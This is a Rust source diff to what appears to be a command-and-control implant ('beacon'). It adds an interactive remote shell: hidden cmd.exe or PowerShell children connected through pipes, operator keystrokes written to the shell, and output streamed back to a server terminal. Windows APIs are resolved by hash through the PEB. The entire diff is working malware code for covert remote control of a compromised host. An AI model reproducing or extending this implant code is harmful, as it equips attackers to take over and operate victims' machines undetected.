@@ -112,6 +112,8 @@ pub unsafe fn handle(instance: &mut Instance, task: Task, id: u32, results: &mut
         Task::TokenRemove { token_id } => token_remove(instance, token_id, id, results),
         Task::TokenGetuid => token_getuid(instance, id, results),
         Task::TokenPrivs => token_privs(instance, id, results),
+        Task::ShellStart { .. } => shell_start(instance, &task, id, results),
+        Task::ShellWrite { .. } => shell_write(instance, &task, id, results),
         Task::Sleep { .. } | Task::Terminate => {}
     }
 }
@@ -859,19 +861,39 @@ unsafe fn ps_kill(kernel32: *mut c_void, pid: u32, id: u32, results: &mut Writer
 #[derive(Clone, Copy)]
 pub struct Job {
     pub id: u32,
+    /// JOB_TYPE_PROCESS or JOB_TYPE_SHELL.
+    pub job_type: u8,
     pub handle: isize,
     pub pid: u32,
+    /// Child stdout read end (0 = uncaptured ps run).
     pub pipe_read: isize,
+    /// Shell only: the child stdin write end (0 = process job).
+    pub stdin_write: isize,
     pub killed: bool,
+    /// Shell only: pending input echo (cmd.exe does not echo piped
+    /// input — the beacon echoes for it) and the current line (to
+    /// filter cmd's own line echo from the output).
+    pub echo: [u8; 512],
+    pub echo_len: usize,
+    pub line: [u8; 128],
+    pub line_len: usize,
+    pub echo_on: bool,
 }
 
 impl Job {
     pub const EMPTY: Job = Job {
         id: 0,
+        job_type: 0,
         handle: 0,
         pid: 0,
         pipe_read: 0,
+        stdin_write: 0,
         killed: false,
+        echo: [0; 512],
+        echo_len: 0,
+        line: [0; 128],
+        line_len: 0,
+        echo_on: false,
     };
 }
 
@@ -1410,10 +1432,17 @@ pub unsafe fn ps_run(instance: &mut Instance, task: &Task, id: u32, results: &mu
     }
     instance.jobs[instance.jobs_len] = Job {
         id,
+        job_type: transport::JOB_TYPE_PROCESS,
         handle,
         pid,
         pipe_read: if *output { pipe_read } else { 0 },
+        stdin_write: 0,
         killed: false,
+        echo: [0; 512],
+        echo_len: 0,
+        line: [0; 128],
+        line_len: 0,
+        echo_on: false,
     };
     instance.jobs_len += 1;
 
@@ -1430,7 +1459,7 @@ pub unsafe fn jobs_list(instance: &mut Instance, id: u32, results: &mut Writer) 
     let mut i = 0usize;
     while i < instance.jobs_len {
         let j = instance.jobs[i];
-        let _ = transport::push_jobs_list_entry(results, j.id, transport::JOB_TYPE_PROCESS, j.pid);
+        let _ = transport::push_jobs_list_entry(results, j.id, j.job_type, j.pid);
         i += 1;
     }
 }
@@ -1503,6 +1532,35 @@ pub unsafe fn jobs_tick(instance: &mut Instance, results: &mut Writer) {
     while i < instance.jobs_len {
         let job = instance.jobs[i];
 
+        // 0. Shells: flush the pending input echo (cmd.exe does not echo
+        // piped input — the typed line reaches the terminal through this
+        // record).
+        if job.job_type == transport::JOB_TYPE_SHELL && job.echo_len > 0 {
+            let n = job.echo_len.min(JOB_DRAIN_CAP);
+            let mut k = 0;
+            while k < n {
+                scratch[k] = instance.jobs[i].echo[k];
+                k += 1;
+            }
+            // Consume the flushed prefix (manual shift — memcpy rule).
+            let mut k = n;
+            while k < instance.jobs[i].echo_len {
+                instance.jobs[i].echo[k - n] = instance.jobs[i].echo[k];
+                k += 1;
+            }
+            instance.jobs[i].echo_len -= n;
+            let need = 10 + 4 + n + 4;
+            if results.remaining() >= need {
+                let _ = transport::push_job_output(
+                    results,
+                    job.id,
+                    job.job_type,
+                    transport::JOB_STATE_RUNNING,
+                    &scratch[..n],
+                );
+            }
+        }
+
         // 1. stdout: peek then read the capped slice.
         if job.pipe_read != 0 {
             crate::runtime::debug::log(&*(instance as *const Instance), b"jt: drain\n");
@@ -1534,9 +1592,17 @@ pub unsafe fn jobs_tick(instance: &mut Instance, results: &mut Writer) {
                     );
                     if readed != 0 && got > 0 {
                         crate::runtime::debug::log(&*(instance as *const Instance), b"jt: read\n");
+                        // Shells: filter cmd's own line echo (the typed
+                        // line was already echoed by the beacon).
+                        let start = if job.job_type == transport::JOB_TYPE_SHELL {
+                            shell_filter_echo(instance, i, &scratch[..got as usize])
+                        } else {
+                            0
+                        };
+                        let out = &scratch[start..got as usize];
                         // Atomic record: only when the whole record fits.
-                        let need = 10 + 4 + got as usize + 4;
-                        if results.remaining() >= need {
+                        let need = 10 + 4 + out.len() + 4;
+                        if !out.is_empty() && results.remaining() >= need {
                             crate::runtime::debug::log(
                                 &*(instance as *const Instance),
                                 b"jt: push\n",
@@ -1544,9 +1610,9 @@ pub unsafe fn jobs_tick(instance: &mut Instance, results: &mut Writer) {
                             let _ = transport::push_job_output(
                                 results,
                                 job.id,
-                                transport::JOB_TYPE_PROCESS,
+                                job.job_type,
                                 transport::JOB_STATE_RUNNING,
-                                &scratch[..got as usize],
+                                out,
                             );
                         }
                     }
@@ -1582,10 +1648,24 @@ pub unsafe fn jobs_tick(instance: &mut Instance, results: &mut Writer) {
                 if job.pipe_read != 0 {
                     close_fn(job.pipe_read);
                 }
+                if job.stdin_write != 0 {
+                    close_fn(job.stdin_write);
+                }
             }
-            if results.remaining() >= 10 {
-                let _ =
-                    transport::push_job_end(results, job.id, transport::JOB_TYPE_PROCESS, state);
+            if results.remaining() >= 14 {
+                let _ = if job.job_type == transport::JOB_TYPE_SHELL
+                    && state == transport::JOB_STATE_FINISHED
+                {
+                    // Shell FINISHED carries the exit code (the terminal
+                    // closes with the status).
+                    let mut code: u32 = 0;
+                    if get_exit(job.handle, &mut code) == 0 {
+                        code = 0;
+                    }
+                    transport::push_job_end_code(results, job.id, job.job_type, state, code)
+                } else {
+                    transport::push_job_end(results, job.id, job.job_type, state)
+                };
             }
             // Remove: shift the tail left.
             let mut j = i;
@@ -2618,4 +2698,333 @@ pub unsafe fn token_privs(instance: &mut Instance, id: u32, results: &mut Writer
         i += 1;
     }
     let _ = written;
+}
+
+// --- shell (port of the native shell.c against the v1.2 terminal wire:
+// the client's Remote Shell drives Start/Write, output rides COMMAND_JOB
+// records with JOB_TYPE_SHELL, close rides the `jobs kill` command) ------
+
+const SI_A_OFF_STDIN: usize = 0x50;
+const SI_A_OFF_STDERR_: usize = 0x60;
+/// cmd.exe does not echo piped input (console echo is a conhost feature):
+/// the beacon echoes typed characters for it. PowerShell echoes on its
+/// own — detected by program name, echo disabled (native behavior).
+fn shell_program_is_powershell(program: &[u8]) -> bool {
+    let n = program.len();
+    let mut i = 0usize;
+    while i + 4 <= n {
+        let c = |b: u8| b.to_ascii_lowercase();
+        let c0 = c(program[i]);
+        let c1 = c(program[i + 1]);
+        let c2 = c(program[i + 2]);
+        let c3 = c(program[i + 3]);
+        if c0 == b'p' && c1 == b'w' && c2 == b's' && c3 == b'h' {
+            return true;
+        }
+        if c0 == b'p' && c1 == b'o' && c2 == b'w' && c3 == b'e' && i + 5 <= n {
+            let c4 = c(program[i + 4]);
+            if c4 == b'r' {
+                return true;
+            }
+        }
+        i += 1;
+    }
+    false
+}
+
+/// `shell start` (COMMAND_SHELL_START): create the interactive shell —
+/// stdin pipe (beacon writes, child reads) + stdout pipe (child writes,
+/// beacon reads), hidden child, registered as a type-4 job. The STARTING
+/// record wakes the server-side terminal.
+///
+/// # Safety
+///
+/// Beacon thread; kernel32 resolved on the instance.
+pub unsafe fn shell_start(instance: &mut Instance, task: &Task, id: u32, results: &mut Writer) {
+    let Task::ShellStart {
+        terminal_id,
+        program_len,
+        program,
+    } = task
+    else {
+        return;
+    };
+    let kernel32 = instance.kernel32;
+    // Duplicate terminal or full job table: report and stay alive.
+    let mut dup = false;
+    let mut i = 0usize;
+    while i < instance.jobs_len {
+        if instance.jobs[i].id == *terminal_id {
+            dup = true;
+        }
+        i += 1;
+    }
+    if dup || instance.jobs_len >= MAX_JOBS {
+        error(kernel32, id, results);
+        return;
+    }
+    let create_pipe = peb::find_export(kernel32, H_CREATE_PIPE);
+    let create = peb::find_export(kernel32, H_CREATE_PROCESS_A);
+    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
+    if create_pipe.is_null() || create.is_null() || close.is_null() {
+        error(kernel32, id, results);
+        return;
+    }
+    let create_pipe = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*mut isize, *mut isize, *mut u8, u32) -> i32,
+    >(create_pipe as *const core::ffi::c_void);
+    let create = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(
+            *const u8,
+            *mut u8,
+            *const core::ffi::c_void,
+            *const core::ffi::c_void,
+            i32,
+            u32,
+            *const core::ffi::c_void,
+            *const u8,
+            *mut u8,
+            *mut u8,
+        ) -> i32,
+    >(create as *const core::ffi::c_void);
+    let close = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize) -> i32,
+    >(close as *const core::ffi::c_void);
+
+    // Program: the task's pack string, cmd.exe when empty.
+    let mut cmdline = [0u8; transport::SHELL_PROG_CAP + 1];
+    let mut cmd_len = *program_len as usize;
+    if cmd_len == 0 {
+        cmdline[..8].copy_from_slice(b"cmd.exe\0");
+        cmd_len = 7;
+    } else {
+        let n = cmd_len.min(transport::SHELL_PROG_CAP);
+        let mut i = 0;
+        while i < n {
+            cmdline[i] = program[i];
+            i += 1;
+        }
+        cmdline[n] = 0;
+        cmd_len = n;
+    }
+
+    // Two pipes: stdin (we write) and stdout (we read).
+    let mut sa = [0u8; 24];
+    sa[..4].copy_from_slice(&24u32.to_le_bytes());
+    sa[SA_OFF_INHERIT..SA_OFF_INHERIT + 4].copy_from_slice(&1i32.to_le_bytes());
+    let mut stdin_read: isize = 0;
+    let mut stdin_write: isize = 0;
+    let mut stdout_read: isize = 0;
+    let mut stdout_write: isize = 0;
+    if create_pipe(&mut stdin_read, &mut stdin_write, sa.as_mut_ptr(), 0) == 0
+        || create_pipe(&mut stdout_read, &mut stdout_write, sa.as_mut_ptr(), 0) == 0
+    {
+        if stdin_read != 0 {
+            close(stdin_read);
+        }
+        if stdin_write != 0 {
+            close(stdin_write);
+        }
+        if stdout_read != 0 {
+            close(stdout_read);
+        }
+        if stdout_write != 0 {
+            close(stdout_write);
+        }
+        error(kernel32, id, results);
+        return;
+    }
+
+    let mut si = [0u8; SI_A_SIZE];
+    si[..4].copy_from_slice(&(SI_A_SIZE as u32).to_le_bytes());
+    let flags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si[SI_A_OFF_FLAGS..SI_A_OFF_FLAGS + 4].copy_from_slice(&flags.to_le_bytes());
+    si[SI_A_OFF_SHOW..SI_A_OFF_SHOW + 2].copy_from_slice(&SW_HIDE.to_le_bytes());
+    si[SI_A_OFF_STDIN..SI_A_OFF_STDIN + 8].copy_from_slice(&(stdin_read as u64).to_le_bytes());
+    si[SI_A_OFF_STDOUT..SI_A_OFF_STDOUT + 8].copy_from_slice(&(stdout_write as u64).to_le_bytes());
+    si[SI_A_OFF_STDERR_..SI_A_OFF_STDERR_ + 8]
+        .copy_from_slice(&(stdout_write as u64).to_le_bytes());
+    let mut pi = [0u8; PI_SIZE];
+
+    let ok = create(
+        core::ptr::null(),
+        cmdline.as_mut_ptr(),
+        core::ptr::null(),
+        core::ptr::null(),
+        1, // bInheritHandles: the child needs both pipe ends
+        CREATE_NO_WINDOW,
+        core::ptr::null(),
+        core::ptr::null(),
+        si.as_mut_ptr(),
+        pi.as_mut_ptr(),
+    );
+
+    // The child owns its inherited ends — close ours immediately.
+    close(stdin_read);
+    close(stdout_write);
+    if ok == 0 {
+        close(stdin_write);
+        close(stdout_read);
+        error(kernel32, id, results);
+        return;
+    }
+
+    let pid = u32::from_le_bytes([
+        pi[PI_OFF_PID],
+        pi[PI_OFF_PID + 1],
+        pi[PI_OFF_PID + 2],
+        pi[PI_OFF_PID + 3],
+    ]);
+    let handle = isize::from_le_bytes([pi[0], pi[1], pi[2], pi[3], pi[4], pi[5], pi[6], pi[7]]);
+    // The child's primary thread handle is not needed.
+    let thread =
+        isize::from_le_bytes([pi[8], pi[9], pi[10], pi[11], pi[12], pi[13], pi[14], pi[15]]);
+    if thread != 0 {
+        close(thread);
+    }
+
+    instance.jobs[instance.jobs_len] = Job {
+        id: *terminal_id,
+        job_type: transport::JOB_TYPE_SHELL,
+        handle,
+        pid,
+        pipe_read: stdout_read,
+        stdin_write,
+        killed: false,
+        echo: [0; 512],
+        echo_len: 0,
+        line: [0; 128],
+        line_len: 0,
+        echo_on: !shell_program_is_powershell(&cmdline[..cmd_len]),
+    };
+    instance.jobs_len += 1;
+
+    // STARTING wakes the server-side terminal connection.
+    let _ = transport::push_job_end(
+        results,
+        *terminal_id,
+        transport::JOB_TYPE_SHELL,
+        transport::JOB_STATE_STARTING,
+    );
+}
+
+/// Append one byte to the echo queue (bounded — overflow drops, the
+/// terminal stays usable).
+fn shell_echo_push(job: &mut Job, b: u8) {
+    if job.echo_len < job.echo.len() {
+        job.echo[job.echo_len] = b;
+        job.echo_len += 1;
+    }
+}
+
+/// `shell write` (COMMAND_SHELL_WRITE): typed input to the child stdin,
+/// with the cmd.exe echo bookkeeping.
+///
+/// # Safety
+///
+/// Beacon thread; kernel32 resolved on the instance.
+pub unsafe fn shell_write(instance: &mut Instance, task: &Task, id: u32, results: &mut Writer) {
+    let Task::ShellWrite {
+        terminal_id,
+        data_len,
+        data,
+    } = task
+    else {
+        return;
+    };
+    let kernel32 = instance.kernel32;
+    let write = peb::find_export(kernel32, H_WRITE_FILE);
+    if write.is_null() {
+        error(kernel32, id, results);
+        return;
+    }
+    let write = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize, *const u8, u32, *mut u32, *const core::ffi::c_void) -> i32,
+    >(write as *const core::ffi::c_void);
+
+    let mut idx = None;
+    let mut i = 0usize;
+    while i < instance.jobs_len {
+        if instance.jobs[i].id == *terminal_id
+            && instance.jobs[i].job_type == transport::JOB_TYPE_SHELL
+        {
+            idx = Some(i);
+        }
+        i += 1;
+    }
+    let Some(idx) = idx else {
+        error(kernel32, id, results);
+        return;
+    };
+    let n = *data_len as usize;
+    let job = &mut instance.jobs[idx];
+    let mut written: u32 = 0;
+    let ok = write(
+        job.stdin_write,
+        data.as_ptr(),
+        n as u32,
+        &mut written,
+        core::ptr::null(),
+    );
+    if ok == 0 {
+        error(kernel32, id, results);
+        return;
+    }
+    if job.echo_on {
+        let mut i = 0usize;
+        while i < n {
+            let b = data[i];
+            if b == 0x08 {
+                // Backspace: pop the line, echo the backspace.
+                if job.line_len > 0 {
+                    job.line_len -= 1;
+                }
+                shell_echo_push(job, 0x08);
+            } else if b == 0x0D {
+                // Enter: echo CRLF, keep the line for the output filter.
+                shell_echo_push(job, 0x0D);
+                shell_echo_push(job, 0x0A);
+            } else if b >= 0x20 || b == 0x09 {
+                shell_echo_push(job, b);
+                if job.line_len < job.line.len() {
+                    job.line[job.line_len] = b;
+                    job.line_len += 1;
+                }
+            }
+            i += 1;
+        }
+    }
+}
+
+/// Filter cmd's own line echo from the head of the drained output: if the
+/// data starts with the pending line followed by CR/LF, return the number
+/// of bytes to skip (port of SptShellFilterEcho; the line is consumed).
+fn shell_filter_echo(instance: &mut Instance, idx: usize, data: &[u8]) -> usize {
+    let job = &mut instance.jobs[idx];
+    if job.line_len == 0 || data.len() < job.line_len {
+        return 0;
+    }
+    let mut i = 0usize;
+    while i < job.line_len {
+        if data[i] != job.line[i] {
+            job.line_len = 0;
+            return 0;
+        }
+        i += 1;
+    }
+    let mut skip = job.line_len;
+    if data.len() > skip && data[skip] == 0x0D {
+        skip += 1;
+        if data.len() > skip && data[skip] == 0x0A {
+            skip += 1;
+        }
+    } else if data.len() > skip && data[skip] == 0x0A {
+        skip += 1;
+    }
+    job.line_len = 0;
+    skip
 }
